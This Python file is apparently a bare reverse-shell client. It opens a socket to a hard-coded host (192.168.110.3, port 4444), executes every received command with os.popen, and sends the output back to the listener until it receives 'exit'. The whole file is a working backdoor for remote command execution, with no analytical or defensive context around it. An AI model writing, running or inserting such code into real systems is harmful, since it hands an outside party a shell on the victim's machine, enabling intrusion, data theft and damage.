import os
import socket

class Conn:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.pipe = None
        self.xxxx()
        self.conn()
    def conn(self):
        self.pipe = socket.socket()
        self.pipe.connect((self.ip, self.port))
        
    def recv(self):
        return self.pipe.recv(1024).decode().strip()
    
    def send(self, res):
        return self.pipe.send(res.encode())
    def xxxx(self):
        pass

def run(command):
    if command == 'exit':
        return False
    r = os.popen(command).read()
    return r+">>> "

if __name__ == '__main__':
    sh = Conn('192.168.110.3', 4444)
    sh.send('>>> ')
    while 1:
        c = sh.recv()
        res = run(c)
        if res != False:
            sh.send(res)
        else:
            break
    sh.pipe.close()